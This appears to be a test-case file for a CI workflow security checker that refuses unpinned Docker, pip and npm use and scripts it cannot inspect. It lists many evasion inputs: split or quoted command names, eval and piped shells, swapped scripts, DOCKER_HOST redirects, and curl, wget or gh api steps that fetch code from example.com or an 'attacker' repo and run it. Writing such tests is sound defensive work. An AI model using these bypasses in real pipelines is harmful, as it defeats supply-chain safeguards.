case_ n27-cp-split             bad "$(rb 'cp "$(command -v d""ocker)" /usr/local/bin/foo; foo run alpine:3.20')"
case_ n28-cd-split-pip         bad "$(rb 'c""d sub; pip install --require-hashes -r requirements.txt')" "printf 'x==1 --hash=sha256:00\\n' > requirements.txt; mkdir -p sub; printf 'evil==9 --hash=sha256:11\\n' > sub/requirements.txt"
case_ n28-pushd-split-build    bad "$(rb 'pus""hd evil; docker build -f Dockerfile -t x .')" "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile; mkdir -p evil; printf 'FROM ubuntu:latest\\n' > evil/Dockerfile"
case_ n28-backslash-cd         bad "$(rb 'c\\d evil; docker build -f Dockerfile -t x .')" "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile; mkdir -p evil; printf 'FROM ubuntu:latest\\n' > evil/Dockerfile"
# --- Sonnet #164 r19 (NEW-29): a parameter expansion's default or alternate word is a literal the shell can run —
#     ${x:-docker}, ${x-docker}, ${x:=docker}, ${x=docker}, ${x:+docker}, nested — it is read as that word (fail closed)
case_ n29-default-run          bad "$(rb '${x:-docker} run alpine:3.20')"
case_ n29-default-pip          bad "$(rb '${x:-pip} install unhashed-package')"
case_ n29-nocolon              bad "$(rb '${x-docker} run alpine:3.20')"
case_ n29-assign               bad "$(rb '${x:=docker} run alpine:3.20')"
case_ n29-alternate            bad "$(rb 'y=1; ${y:+docker} run alpine:3.20')"
case_ n29-npm                  bad "$(rb '${x:-npm} install left-pad')"
case_ n29-quoted               bad "$(rb '"${x:-docker}" run alpine:3.20')"
case_ n29-nested               bad "$(rb '${a:-${b:-docker}} run alpine:3.20')"
case_ n29-cd                   bad "$(rb '${x:-cd} evil; docker build -f Dockerfile -t y .')" "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile; mkdir -p evil; printf 'FROM ubuntu:latest\\n' > evil/Dockerfile"
case_ n29-pushd                bad "$(rb '${x:-pushd} evil; pip install --require-hashes -r requirements.txt')" "printf 'x==1 --hash=sha256:00\\n' > requirements.txt; mkdir -p evil; printf 'e==9 --hash=sha256:11\\n' > evil/requirements.txt"
case_ n29-alias                bad "$(rb '${x:-alias} foo=docker; foo run alpine:3.20')"
case_ n29-cp-rename            bad "$(rb '${x:-cp} "$(command -v docker)" /tmp/foo; /tmp/foo run alpine:3.20')"
# the default word is pinned, but bash runs $DOCKER_BIN when it is set (Codex #164 r3, N03): refused
case_ n29-default-pinned       bad "$(rb '${DOCKER_BIN:-docker} run alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667')"
case_ n29-plain-default-ok     ok  "$(rb 'echo "${GITHUB_REF_NAME:-none}" "${1:-}" "${X:?unset}"')"
# --- Sonnet #164 r20 (NEW-30, NEW-31): ANSI-C ($'d'ocker) and locale ($"d"ocker) quoting splice a word as bash reads it;
#     every check reads the decoded word (fail closed)
case_ n30-ansi-splice-run      bad "$(rb "\$'d'ocker run alpine:latest")"
case_ n30-ansi-mid             bad "$(rb "do\$'c'ker run alpine:latest")"
case_ n30-ansi-path            bad "$(rb "/usr/bin/\$'d'ocker run alpine:latest")"
case_ n30-ansi-pip             bad "$(rb "\$'p'ip install alpine")"
case_ n30-locale-splice        bad "$(rb '$"d"ocker run alpine:latest')"
case_ n31-ansi-cd              bad "$(rb "c\$'d' sub; docker build -t myimg .")" "printf 'FROM scratch\\n' > Dockerfile; mkdir -p sub; printf 'FROM alpine:latest\\n' > sub/Dockerfile"
case_ n31-ansi-pushd           bad "$(rb "p\$'u'shd sub; docker build -t myimg .")" "printf 'FROM scratch\\n' > Dockerfile; mkdir -p sub; printf 'FROM alpine:latest\\n' > sub/Dockerfile"
case_ n31-locale-cd            bad "$(rb 'c$"d" sub; docker build -t myimg .')" "printf 'FROM scratch\\n' > Dockerfile; mkdir -p sub; printf 'FROM alpine:latest\\n' > sub/Dockerfile"
case_ n30-ansi-tab-still-ok    ok  "$(rb "IFS=\$'\\t' read -r a b <<< x; curl -s -w \$'\\n%{http_code}' -o /dev/null https://example.org")"
# --- Sonnet #164 r21 (NEW-32): a shell (or source / .) that reads its script from stdin, a herestring or a process
#     substitution runs text this check never reads: refused (fail closed)
case_ n32-echo-pipe-bash       bad "$(rb 'echo "docker pull cool/image:1.2.3" | bash')"
case_ n32-herestring           bad "$(rb 'bash <<< "docker run alpine"')"
case_ n32-pip-pipe             bad "$(rb 'echo "pip install unhashed-package" | bash')"
case_ n32-process-subst        bad "$(rb "bash <(printf 'docker run alpine\\n')")"
case_ n32-source-subst         bad "$(rb "source <(printf 'docker run alpine\\n')")"
case_ n32-dot-subst            bad "$(rb ". <(printf 'docker run alpine\\n')")"
case_ n32-printf-pipe-sh       bad "$(rb "printf 'docker run alpine\\n' | sh")"
case_ n32-cat-pipe-bash        bad "$(rb 'printf x > /tmp/gen.sh; cat /tmp/gen.sh | bash')"
case_ n32-bash-s               bad "$(rb 'bash -s < /tmp/gen.sh')"
case_ n32-bash-dev-stdin       bad "$(rb 'bash /dev/stdin < /tmp/gen.sh')"
case_ n32-sudo-bash-pipe       bad "$(rb 'echo x | sudo bash')"
case_ n32-combined-o-stdin     bad "$(rb 'echo x | bash -eo pipefail')"
case_ n32-combined-o-file-ok   ok  "$(rb 'bash -eo pipefail bin/x.sh')" "mkdir -p bin; printf 'echo x\\n' > bin/x.sh"
case_ n32-repo-script-ok       ok  "$(rb 'bash bin/x.sh --flag; sh ./tools/y.sh')" "mkdir -p bin tools; printf 'echo x\\n' > bin/x.sh; printf 'echo y\\n' > tools/y.sh"
case_ n32-bash-c-ok            ok  "$(rb 'bash -c "echo hi"')"
case_ n32-docker-shell-arg-ok  ok  "$(rb 'docker run --rm alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667 sh -c true')"
# --- Codex #164 adversarial r1 (C01, C03-C13): each a fail-closed reading of what bash, pip, docker or BuildKit does
case_ c01-backslash-newline    bad "$(rb "doc\\
          ker run alpine:3.20")"
case_ c01-glob-name            bad "$(rb '/usr/bin/docke[r] run alpine:3.20')"
case_ c01-glob-star            bad "$(rb '/usr/bin/dock?r run alpine:3.20')"
case_ c01-ansi-whole           bad "$(rb "\$'docker' run alpine:3.20")"
case_ c03-error-word-subst     bad "$(rb 'unset missing; : "${missing:?$(docker pull alpine)}"')"
case_ c04-mpip-attached        bad "$(rb 'python3 -mpip install requests')"
case_ c04-pip-main             bad "$(rb 'python3 -m pip.__main__ install requests')"
case_ c04-setup-flag           bad "$(rb 'python3 -I setup.py install')"
case_ c04-uv-option            bad "$(rb 'uv --no-cache pip install requests')"
case_ c04-pipx-option          bad "$(rb 'pipx --verbose install black')"
case_ c04-npm-prefix           bad "$(rb 'npm --prefix /tmp/pkg install lodash')"
case_ c04-npm-alias            bad "$(rb 'npm in lodash')"
case_ c05-log-swallows         bad "$(rb 'pip install --log --require-hashes -r req.txt')" "printf 'requests==2.32.3\\n' > req.txt"
case_ c05-unknown-option       bad "$(rb 'pip install --require-hashes --frobnicate -r req.txt')" "printf 'x==1 --hash=sha256:00\\n' > req.txt"
case_ c05-hashed-ok            ok  "$(rb 'python3 -m pip install --quiet --require-hashes --only-binary=:all: --break-system-packages -r req.txt')" "printf 'x==1 --hash=sha256:00\\n' > req.txt"
case_ c06-skopeo-optval        bad "$(rb 'skopeo copy --override-os linux docker://alpine:latest dir:/tmp/img')"
case_ c06-crane-optval         bad "$(rb 'PLATFORM=linux/amd64; crane pull --platform "$PLATFORM" alpine:latest /tmp/img.tar')"
case_ c07-attached-f           bad "$(rb 'docker build -fDockerfile.evil .')" "printf 'FROM scratch\\n' > Dockerfile; printf 'FROM alpine:latest\\n' > Dockerfile.evil"
case_ c07-f-equals             bad "$(rb 'docker build -f=Dockerfile.evil .')" "printf 'FROM scratch\\n' > Dockerfile; printf 'FROM alpine:latest\\n' > Dockerfile.evil"
case_ c08-self-stage           bad "$(rb 'docker build -f Dockerfile.self .')" "printf 'FROM alpine AS alpine\\n' > Dockerfile.self"
case_ c09-copy-from-image      bad "$(rb 'docker build -f Dockerfile.copy .')" "printf 'FROM scratch\\nCOPY --from=alpine:latest /etc/os-release /r\\n' > Dockerfile.copy"
case_ c09-syntax-directive     bad "$(rb 'docker build -f Dockerfile.syntax .')" "printf '# syntax=docker/dockerfile:latest\\nFROM scratch\\n' > Dockerfile.syntax"
case_ c09-buildkit-syntax-arg  bad "$(rb 'docker build --build-arg BUILDKIT_SYNTAX=docker/dockerfile:latest .')" "printf 'FROM scratch\\n' > Dockerfile"
case_ c09-copy-from-stage-ok   ok  "$(rb 'docker build -f Dockerfile.ms .')" "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667 AS base\\nFROM scratch\\nCOPY --from=base /etc/os-release /r\\n' > Dockerfile.ms"
case_ c10-pull-local-name      bad "$(rb 'docker build -t alpine .; docker pull alpine')" "printf 'FROM scratch\\n' > Dockerfile"
case_ c10-pull-always          bad "$(rb 'docker build -t alpine .; docker run --pull=always alpine')" "printf 'FROM scratch\\n' > Dockerfile"
case_ c10-branch-build         bad "$(rb 'if false; then docker build -t alpine .; fi; docker run alpine')" "printf 'FROM scratch\\n' > Dockerfile"
case_ c10-rmi                  bad "$(rb 'docker build -t alpine .; docker rmi alpine; docker run alpine')" "printf 'FROM scratch\\n' > Dockerfile"
case_ c10-template-sibling     bad "$(rb 'v=example; docker build -t "hello-${v}" .; docker run hello-world')" "printf 'FROM scratch\\n' > Dockerfile"
case_ c10-own-build-localtrust-removed-bad bad  "$(rb 'docker build -t fscache-local .; docker run --rm fscache-local')" "printf 'FROM scratch\\n' > Dockerfile"
case_ c11-dir-copy             bad "$(rb 'cp -R evil/. .; docker build .')" "printf 'FROM scratch\\n' > Dockerfile; mkdir -p evil; printf 'FROM alpine\\n' > evil/Dockerfile"
case_ c11-printf-consumer      bad "$(rb 'printf "FROM alpine\\n" > Dockerfile docker build; docker build .')" "printf 'FROM scratch\\n' > Dockerfile"
case_ c12-hash-p               bad "$(rb 'hash -p /usr/bin/docker d; d run alpine:3.20')"
case_ c13-quoted-export        bad "$(rb 'export "DOCKER_HOST=tcp://other:2375"; docker run alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667')"
case_ c13-quoted-assign        bad "$(rb "'DOCKER_HOST=tcp://other:2375' docker run alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667")"
# --- Codex #164 adversarial r1 C02 (advisor ruling 0094): a committed shell script a step runs is read at its committed
#     bytes, recursively; a script that is not a committed file is refused; nesting past the depth limit is refused;
#     inline code for another interpreter (-c / -e) is refused; a heredoc or committed file in another language is the
#     documented boundary
case_ c02-bash-ec              bad "$(rb 'bash -ec "docker run alpine"')"
case_ c02-sh-ec                bad "$(rb 'sh -ec "docker run alpine"')"
case_ c02-committed-script     bad "$(rb 'bash ci-image.sh')" "printf 'docker run alpine\\n' > ci-image.sh"
case_ c02-committed-direct     bad "$(rb './ci-image.sh')" "printf '#!/bin/sh\\ndocker run alpine\\n' > ci-image.sh"
case_ c02-committed-source     bad "$(rb 'source ci-image.sh')" "printf 'docker run alpine\\n' > ci-image.sh"
case_ c02-script-calls-script  bad "$(rb 'bash a.sh')" "printf 'bash b.sh\\n' > a.sh; printf 'pip install requests\\n' > b.sh"
case_ c02-committed-script-ok  ok  "$(rb 'bash ci-ok.sh')" "printf 'docker run alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > ci-ok.sh"
case_ c02-uncommitted-script   bad "$(rb 'printf x > /tmp/gen.sh; bash /tmp/gen.sh')"
case_ c02-variable-script      bad "$(rb 'bash "$script"')"
case_ c02-eval-deep            bad "$(rb "eval 'eval '\"'\"'eval '\"'\"'\"'\"'\"'\"'\"'\"'eval docker run alpine'\"'\"'\"'\"'\"'\"'\"'\"''\"'\"''")"
case_ c02-node-e               bad "$(rb 'node -e "require(\"child_process\").execFileSync(\"docker\", [\"run\", \"alpine\"])"')"
case_ c02-perl-e               bad "$(rb "perl -e 'system(\"docker run alpine\")'")"
case_ c02-ruby-e               bad "$(rb "ruby -e 'system(\"docker run alpine\")'")"
case_ c02-python-c             bad "$(rb "python3 -c 'import subprocess; subprocess.run([\"docker\", \"run\", \"alpine\"])'")"
case_ c02-python-heredoc-ok    ok  "$(rb "python3 - <<'PY'
          print('boundary')
          PY")"
case_ c02-committed-py-ok      ok  "$(rb 'python3 bin/tool.py --x')" "mkdir -p bin; printf 'print(1)\\n' > bin/tool.py"
case_ c02-arith-ok             ok  "$(rb 'age=$(( $(date -u +%s) - 1 ))')"
case_ c02-arith-inner-run      bad "$(rb 'x=$(( $(docker run alpine) + 1 ))')"
case_ c02-workspace-script     bad "$(rb 'bash "${GITHUB_WORKSPACE}/ci-image.sh"')" "printf 'docker run alpine\\n' > ci-image.sh"
case_ c02-main-copy-bad        bad "$(rb 'gh api "repos/${GITHUB_REPOSITORY}/contents/bin/g.sh?ref=main" --jq .content | base64 -d > "${RUNNER_TEMP}/g.sh"; bash "${RUNNER_TEMP}/g.sh"')" "mkdir -p bin; printf 'docker run alpine\\n' > bin/g.sh"
case_ c02-main-copy-ok         ok  "$(rb 'gh api "repos/${GITHUB_REPOSITORY}/contents/bin/g.sh?ref=main" --jq .content | base64 -d > "${RUNNER_TEMP}/g.sh"; bash "${RUNNER_TEMP}/g.sh"')" "mkdir -p bin; printf 'docker run alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > bin/g.sh"
case_ c02-foreign-heredoc-ok   ok  "$(rb "python3 - <<'PY'
          import os
          os.system('docker run alpine')
          PY")"
case_ c02-test-harness-ok      ok  "$(rb 'bash bin/t-test.sh')" "mkdir -p bin; printf 'printf %%s \"DOCKER_HOST=x\"; alias q=r\\n' > bin/t-test.sh"
case_ c02-generated-elsewhere  bad "$(rb 'printf x > /tmp/smoke-assert.sh; bash /tmp/smoke-assert.sh')"
# --- Sonnet #164 r22 (NEW-33, NEW-34) + advisor 0084 (2): a program named by a variable — eval "$x", bash -c "$x", a bare
#     $x as the command — runs text this check cannot read: refused (fail closed); < <(…) feeding a shell is stdin
case_ n33-eval-var             bad "$(rb 'SCRIPT="docker run alpine:latest"; eval "$SCRIPT"')"
case_ n33-eval-var-pip         bad "$(rb 'SCRIPT="pip install requests"; eval "$SCRIPT"')"
case_ n33-bash-c-var           bad "$(rb 'SCRIPT=$(cat payload/cmd.txt); bash -c "$SCRIPT"')" "mkdir -p payload; printf 'docker run alpine:latest\\n' > payload/cmd.txt"
case_ n33-bare-var             bad "$(rb 'SCRIPT=$(cat payload/cmd.txt); $SCRIPT')" "mkdir -p payload; printf 'docker run alpine:latest\\n' > payload/cmd.txt"
case_ n33-quoted-var-program   bad "$(rb 'gosec="$(go env GOPATH)/bin/gosec"; "$gosec" ./...')"
case_ n33-sudo-var             bad "$(rb 'sudo "$tool" run alpine')"
case_ n33-var-args-ok          ok  "$(rb 'go test -run "$PATTERN" ./...; echo "$x"')"
case_ n34-spaced-subst-sh      bad "$(rb 'sh < <(echo "docker run alpine:latest")')"
case_ n34-fd-subst-bash        bad "$(rb 'bash 0< <(cat payload/cmd.txt)')" "mkdir -p payload; printf 'docker run alpine:latest\\n' > payload/cmd.txt"
case_ n34-spaced-subst-source  bad "$(rb 'source < <(echo "docker run alpine:latest")')"
# --- Codex #164 adversarial r2: variants of C01, C02, C04, C05, C09, C10, C11, C13, and N01
case_ r2c01-bracket-only       bad "$(rb '/usr/bin/[d][o][c][k][e][r] run alpine')"
case_ r2c02-env-bash           bad "$(rb 'env bash ci-image.sh')" "printf 'docker run alpine\\n' > ci-image.sh"
case_ r2c02-command-bash       bad "$(rb 'command bash ci-image.sh')" "printf 'docker run alpine\\n' > ci-image.sh"
case_ r2c02-bash-c-script      bad "$(rb 'bash -c "bash ci-image.sh"')" "printf 'docker run alpine\\n' > ci-image.sh"
case_ r2c02-subst-script       bad "$(rb 'out=$(bash ci-image.sh)')" "printf 'docker run alpine\\n' > ci-image.sh"
case_ r2c02-env-shebang        bad "$(rb './runner')" "printf '#!/usr/bin/env bash\\ndocker run alpine\\n' > runner"
case_ r2c02-replaced-script    bad "$(rb "printf 'docker run alpine\\n' > ci-ok.sh; bash ci-ok.sh")" "printf 'echo ok\\n' > ci-ok.sh"
case_ r2c02-fake-provenance    bad "$(rb "echo 'git show HEAD:ci-ok.sh'; printf 'docker run alpine\\n' > \"\${RUNNER_TEMP}/ci-ok.sh\"; bash \"\${RUNNER_TEMP}/ci-ok.sh\"")" "printf 'echo ok\\n' > ci-ok.sh"
case_ r2c02-foreign-repo       bad "$(rb 'gh api "repos/attacker/payload/contents/ci-ok.sh?ref=main" --jq .content | base64 -d > "${RUNNER_TEMP}/ci-ok.sh"; bash "${RUNNER_TEMP}/ci-ok.sh"')" "printf 'echo ok\\n' > ci-ok.sh"
case_ r2c02-cd-in-parent       bad "$(rb 'bash parent.sh')" "printf 'cd evil\\nbash child.sh\\n' > parent.sh; printf 'echo ok\\n' > child.sh; mkdir -p evil; printf 'docker run alpine\\n' > evil/child.sh"
case_ r2c02-ansi-in-script     bad "$(rb 'bash ci-x.sh')" "printf \"\\$'\\\\\\\\x64ocker' run alpine\\n\" > ci-x.sh"
case_ r2c02-node-eval-eq       bad "$(rb "node --eval='require(1)'")"
case_ r2c02-perl-attached      bad "$(rb "perl -e'system(1)'")"
case_ r2c02-ruby-attached      bad "$(rb "ruby -e'system(1)'")"
case_ r2c04-python-cluster     bad "$(rb 'python3 -Im pip install requests')"
case_ r2c05-pip-log-list       bad "$(rb 'pip --log list install requests')"
case_ r2c05-pip-log-help       bad "$(rb 'pip --log help install requests')"
case_ r2c09-syntax-from-env    bad "$(rb 'BUILDKIT_SYNTAX=docker/dockerfile:latest docker build --build-arg BUILDKIT_SYNTAX .')" "printf 'FROM scratch\\n' > Dockerfile"
case_ r2c09-sbom-generator      bad "$(rb 'docker buildx build --sbom=generator=docker/buildkit-syft-scanner:stable .')" "printf 'FROM scratch\\n' > Dockerfile"
case_ r2c09-attest-generator    bad "$(rb 'docker buildx build --attest type=sbom,generator=docker/buildkit-syft-scanner:stable .')" "printf 'FROM scratch\\n' > Dockerfile"
case_ r2c10-mid-line-if        bad "$(rb 'true; if false; then docker build -t alpine .; fi; docker run alpine')" "printf 'FROM scratch\\n' > Dockerfile"
case_ r2c10-rmi-latest         bad "$(rb 'docker build -t alpine .; docker rmi alpine:latest; docker run alpine')" "printf 'FROM scratch\\n' > Dockerfile"
case_ r2c10-unbound-loop       bad "$(rb 'for v in world; do :; done; v=example; docker build -t "hello-${v}" .; docker run hello-world')" "printf 'FROM scratch\\n' > Dockerfile"
case_ r2c10-step-if            bad "$head
    steps:
      - if: \${{ false }}
        run: docker build -t alpine .
      - run: docker run alpine" "printf 'FROM scratch\\n' > Dockerfile"
case_ r2c11-parent-copy        bad "$(rb 'cp -R evil/. .; docker build safe')" "mkdir -p safe evil/safe; printf 'FROM scratch\\n' > safe/Dockerfile; printf 'FROM alpine\\n' > evil/safe/Dockerfile"
case_ r2c11-env-cp             bad "$(rb 'env cp -R evil/. .; docker build .')" "printf 'FROM scratch\\n' > Dockerfile; mkdir -p evil; printf 'FROM alpine\\n' > evil/Dockerfile"
case_ r2c11-script-mutates     bad "$(rb 'bash mutate.sh; docker build .')" "printf 'FROM scratch\\n' > Dockerfile; printf \"printf 'FROM alpine\\\\\\\\n' > Dockerfile\\n\" > mutate.sh"
case_ r2c13-printf-v           bad "$(rb 'docker build -t alpine .; printf -v DOCKER_HOST %s tcp://other:2375; export DOCKER_HOST; docker run alpine')" "printf 'FROM scratch\\n' > Dockerfile"
case_ r2c13-read               bad "$(rb 'read -r DOCKER_HOST <<< tcp://other:2375; export DOCKER_HOST; docker run alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667')"
case_ r2n01-unquoted-heredoc   bad "$(rb 'python3 - <<PY
          print("$(docker pull alpine)")
          PY')"
case_ r2r03-tests-dir-script   bad "$(rb 'bash x/tests/payload.sh')" "mkdir -p x/tests; printf 'docker run alpine\\n' > x/tests/payload.sh"
case_ r2c10-localhost-cond-ok   ok  "$head
    steps:
      - if: \${{ inputs.mode == 'build' }}
        run: docker build -t localhost/fa-production .
      - run: docker run --pull=never localhost/fa-production" "printf 'FROM scratch\\n' > Dockerfile"
# --- Sonnet #164 r23 (NEW-35): a program the job downloads, writes or makes executable, then runs directly, is a script
#     this check cannot read: refused
case_ n35-curl-chmod-run       bad "$(rb 'curl -sL -o /tmp/setup https://example.com/ci/setup; chmod +x /tmp/setup; /tmp/setup')"
case_ n35-base64-chmod-run     bad "$(rb "printf '%s\\n' 'docker pull alpine:latest' | base64 > /tmp/x.b64; base64 -d /tmp/x.b64 > /tmp/x; chmod +x /tmp/x; /tmp/x")"
case_ n35-wget-run             bad "$(rb 'wget -O /tmp/inst https://example.com/i; chmod 755 /tmp/inst; /tmp/inst --flag')"
case_ n35-built-binary-ok      ok  "$(rb 'mkdir -p /tmp/bins; tar xzf dist/fscache.tgz -C /tmp/bins fscache; /tmp/bins/fscache --version')"
# --- Sonnet #164 r24: a pip -r file must be a committed regular FILE — a committed symlink points at bytes nobody reviewed
case_ r24-req-symlink          bad "$(rb 'pip install --require-hashes -r reqs.txt')" "ln -s /tmp/poison.txt reqs.txt"
# --- Codex #164 adversarial r3: C01, C02, C08-C11, C13, N01, N03, N04
case_ r3c01-posix-class        bad "$(rb '/usr/bin/[[:lower:]]ocker run alpine')"
case_ r3c02-command-source     bad "$(rb 'command source ci-image.sh')" "printf 'docker run alpine\\n' > ci-image.sh"
case_ r3c02-env-u-bash         bad "$(rb 'env -u BASH_ENV bash ci-image.sh')" "printf 'docker run alpine\\n' > ci-image.sh"
case_ r3c02-lead-redirect      bad "$(rb '> /dev/null bash ci-image.sh')" "printf 'docker run alpine\\n' > ci-image.sh"
case_ r3c02-env-u-node         bad "$(rb "env -u PYTHONPATH node -e 'require(1)'")"
case_ r3c02-env-S              bad "$(rb "env -S 'bash ci-image.sh'")" "printf 'docker run alpine\\n' > ci-image.sh"
case_ r3c02-glob-exec          bad "$(rb './[r]unner')" "printf '#!/usr/bin/env bash\\ndocker run alpine\\n' > runner"
case_ r3c02-replace-dotslash   bad "$(rb "printf 'docker run alpine\\n' > ci-ok.sh; bash ./ci-ok.sh")" "printf 'echo ok\\n' > ci-ok.sh"
case_ r3c02-replace-workspace  bad "$(rb "printf 'docker run alpine\\n' > ci-ok.sh; bash \"\$GITHUB_WORKSPACE/ci-ok.sh\"")" "printf 'echo ok\\n' > ci-ok.sh"
case_ r3c02-replace-bash-c     bad "$(rb "bash -c \"printf 'docker run alpine\\\\n' > ci-ok.sh\"; bash ci-ok.sh")" "printf 'echo ok\\n' > ci-ok.sh"
case_ r3c02-replace-by-script  bad "$(rb 'bash mutate.sh; bash ci-ok.sh')" "printf 'echo ok\\n' > ci-ok.sh; printf \"printf 'docker run alpine\\\\\\\\n' > ci-ok.sh\\n\" > mutate.sh"
case_ r3c02-replace-harness    bad "$(rb "printf 'docker run alpine\\n' > bin/probe-test.sh; bash bin/probe-test.sh")" "mkdir -p bin; printf 'echo ok\\n' > bin/probe-test.sh"
case_ r3c02-api-unrelated      bad "$(rb 'gh api "repos/$GITHUB_REPOSITORY/contents/ci-ok.sh?ref=main" --jq .content >/dev/null; printf "docker run alpine\\n" > "$RUNNER_TEMP/ci-ok.sh"; bash "$RUNNER_TEMP/ci-ok.sh"')" "printf 'echo ok\\n' > ci-ok.sh"
case_ r3c02-git-show-ref       bad "$(rb 'git show attacker:ci-ok.sh > "$RUNNER_TEMP/ci-ok.sh"; bash "$RUNNER_TEMP/ci-ok.sh"')" "printf 'echo ok\\n' > ci-ok.sh"
case_ r3c02-python-generated   bad "$(rb "printf 'import os\\n' > /tmp/fetch.py; python3 /tmp/fetch.py")"
case_ r3c08-from-number        bad "$(rb 'docker build .')" "printf 'FROM scratch AS base\\nFROM 0\\n' > Dockerfile"
case_ r3c09-sbom-true          bad "$(rb 'docker buildx build --sbom=true --output type=local,dest=/tmp/out .')" "printf 'FROM scratch\\n' > Dockerfile"
case_ r3c09-attest-sbom        bad "$(rb 'docker buildx build --attest=type=sbom --output type=local,dest=/tmp/out .')" "printf 'FROM scratch\\n' > Dockerfile"
case_ r3c10-function           bad "$(rb 'build_it() { docker build -t alpine .; }; docker run alpine')" "printf 'FROM scratch\\n' > Dockerfile"
case_ r3c10-empty-loop         bad "$(rb 'for v in; do docker build -t alpine .; done; docker run alpine')" "printf 'FROM scratch\\n' > Dockerfile"
case_ r3c10-subst-later        bad "$(rb 'docker run alpine; out=$(docker build -t alpine .)')" "printf 'FROM scratch\\n' > Dockerfile"
case_ r3c10-script-before      bad "$(rb 'bash run.sh; docker build -t alpine .')" "printf 'FROM scratch\\n' > Dockerfile; printf 'docker run alpine\\n' > run.sh"
case_ r3c10-skopeo-local       bad "$(rb 'docker build -t alpine .; skopeo copy docker://alpine docker-archive:/tmp/a')" "printf 'FROM scratch\\n' > Dockerfile"
case_ r3c10-crane-local        bad "$(rb 'docker build -t alpine .; crane pull alpine /tmp/image.tar')" "printf 'FROM scratch\\n' > Dockerfile"
case_ r3c10-localhost-cond     bad "$(rb 'if false; then docker build -t localhost/probe .; fi; docker run localhost/probe')" "printf 'FROM scratch\\n' > Dockerfile"
case_ r3c10-pull-never-ok      ok  "$(rb 'docker run --pull=never localhost/fa-production')"
case_ r3c11-adjacent-redirect  bad "$(rb "printf 'FROM alpine\\n'>Dockerfile; docker build .")" "printf 'FROM scratch\\n' > Dockerfile"
case_ r3c11-workspace-abs      bad "$(rb 'cp -R evil/. /home/runner/work/cache/cache/; docker build .')" "printf 'FROM scratch\\n' > Dockerfile; mkdir -p evil; printf 'FROM alpine\\n' > evil/Dockerfile"
case_ r3c11-tar-workspace      bad "$(rb 'tar xf evil.tar -C /home/runner/work/cache/cache; docker build .')" "printf 'FROM scratch\\n' > Dockerfile"
case_ r3c11-mpip-req           bad "$(rb 'curl -fsSL https://example.org/req.txt -o /tmp/req.txt; python3 -Im pip install --require-hashes -r /tmp/req.txt')"
case_ r3c11-pipmain-req        bad "$(rb 'python3 -m pip.__main__ install --require-hashes -r /tmp/req.txt')"
case_ r3c13-flow-env           bad "$head
    steps:
      - run: docker build -t alpine .
      - env: {DOCKER_HOST: \"tcp://other:2375\"}
        run: docker run alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667"
case_ r3c13-quoted-env-key     bad "$head
    steps:
      - env:
          \"DOCKER_HOST\": tcp://other:2375
        run: docker run alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667"
case_ r3n01-comment-marker     bad "$(rb '# <<EOF
          docker run alpine')"
case_ r3n01-string-marker      bad "$(rb "echo '<<EOF'
          docker run alpine")"
case_ r3n01-quoted-subst       bad "$(rb "cat <<EOF
          '\$(docker pull alpine)'
          EOF")"
case_ r3n03-default-program    bad "$(rb 'tool=docker; "${tool:-echo}" run alpine')"
case_ r3n03-default-eval       bad "$(rb 'payload="docker run alpine"; eval "${payload:-:}"')"
# Codex #164 adversarial r1: B2 (trap runs a literal command on a signal), B3 (--pull keeps only its LAST value, like
# any Docker/pflag string flag), B4 (--cache-from names a registry image), B5 (crane index append/filter fetch their
# sources; list is read-only)
case_ r4b2-trap-exit-bad       bad "$(rb "trap 'docker run --rm alpine:3.20 echo x' EXIT; true")"
case_ r4b2-trap-pinned-ok      ok  "$(rb "trap 'docker run --rm alpine@$DIG echo x' EXIT; true")"
case_ r4b2-trap-print-ok       ok  "$(rb 'trap -p EXIT')"
case_ r4b2-trap-reset-ok       ok  "$(rb 'trap EXIT')"
case_ r4b2-trap-dashdash-bad   bad "$(rb "trap -- 'docker run --rm alpine:3.20 echo x' EXIT; true")"
case_ r4b2-trap-dashdash-ok    ok  "$(rb "trap -- 'docker run --rm alpine@$DIG echo x' EXIT; true")"
# Sonnet #164 r5: after -- (the option terminator), the command is unconditional — a command that itself happens to
# start with a dash (legal text once -- has already ended option parsing) must still be read, not waved through
case_ r4b2-trap-dashdash-dash-cmd-bad bad "$(rb "trap -- '-rf; docker run --rm alpine:3.20 echo x' EXIT; true")"
case_ r4b2-trap-dashdash-dash-cmd-ok  ok  "$(rb "trap -- '-rf; docker run --rm alpine@$DIG echo x' EXIT; true")"
case_ r4b3-pull-never-then-always-bad bad "$(rb 'docker run --pull=never --pull=always --rm alpine:3.20 true')"
case_ r4b3-pull-always-then-never-ok  ok  "$(rb 'docker run --pull=always --pull=never --rm localhost/fa-x true')"
case_ r4b3-pull-bare-always-last-bad  bad "$(rb 'docker run --pull never --pull always --rm alpine:3.20 true')"
case_ r4b4-cache-from-tag-bad  bad "$(rb 'docker build --cache-from alpine:3.20 -f build/docker/Dockerfile.production .')" 'mkdir -p build/docker; printf "FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667
" > build/docker/Dockerfile.production'
case_ r4b4-cache-from-digest-ok ok "$(rb "docker build --cache-from alpine@$DIG -f build/docker/Dockerfile.production .")" 'mkdir -p build/docker; printf "FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667
" > build/docker/Dockerfile.production'
